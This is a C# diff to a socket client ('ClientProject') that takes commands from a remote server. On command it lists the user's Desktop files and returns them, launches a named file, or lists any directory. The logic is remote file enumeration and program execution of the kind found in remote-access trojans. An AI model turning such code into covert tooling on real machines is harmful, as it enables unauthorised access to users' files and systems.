@@ -64,6 +64,7 @@ namespace ClientProject
                 bytes = socket.Receive(data);
                 stringBuilder.Append(Encoding.Unicode.GetString(data, 0, bytes));
             } while (socket.Available > 0);
+
             if(stringBuilder.ToString().ToLower() == "exit")
             {
                 Environment.Exit(0);
@@ -72,23 +73,41 @@ namespace ClientProject
         }
         public void GetServerCommand(StringBuilder command)
         {
-            if (command.ToString().ToLower().Contains("start"))
+            string[] arr_command = command.ToString().Split("\n");
+            string[] tmp = { };
+            if (arr_command[0] == "search")
             {
-                if (command.ToString().ToLower().Contains("chrome"))
+                try
                 {
-                    Search("chrome");
+                    tmp = Directory.GetFiles(@$"C:\Users\" + $"{Environment.UserName}" + @"\Desktop", "*", SearchOption.AllDirectories);
+                    SendMsg(tmp);
                 }
-                if (command.ToString().ToLower().Contains("opera"))
+                catch (Exception ex)
                 {
-                    Search("opera");
+
+                    SendMsg(ex.Message);
                 }
-                if (command.ToString().ToLower().Contains("mozilla"))
+            }
+            if (arr_command[0] == "start")
+            {
+                try
                 {
-                    Search("mozilla");
+                    tmp = Directory.GetFiles(@$"C:\Users\" + $"{Environment.UserName}" + @"\Desktop", "*", SearchOption.AllDirectories);
+
+                    foreach (var item in tmp)
+                    {
+                        if (item.ToLower().EndsWith(arr_command[1].ToLower()))
+                        {
+                            Process.Start(item);
+                            SendMsg("Success start!");
+                            break;
+                        }
+                    }
+                   
                 }
-                if (command.ToString().ToLower().Contains("edge"))
+                catch (Exception ex)
                 {
-                    Search("edge");
+                    SendMsg(ex.Message);
                 }
             }
             else
@@ -97,7 +116,7 @@ namespace ClientProject
                 {
                     try
                     {
-                        SendMsg(Directory.GetFiles(command.ToString(), "*.exe"));
+                        SendMsg(Directory.GetFiles(command.ToString()));
                     }
                     catch (Exception ex)
                     {
@@ -113,20 +132,16 @@ namespace ClientProject
             }
            
         }
-        public void Search(string file_name)
+        public void Search()
         {
-            try
+        try
             {
-                foreach (var item in Directory.GetFiles(@$"C:\Users\{Environment.UserName}", $"{file_name}"+".exe", SearchOption.AllDirectories))
-                {
-                    Console.WriteLine(item + "\n");
-                }
+                SendMsg(Directory.GetFiles(@$"C:\Users\" + $"{Environment.UserName}" + @"\Desktop", "*", SearchOption.AllDirectories));
             }
             catch (Exception ex)
             {
                 SendMsg(ex.Message);
             }
-           
         }
 
     }
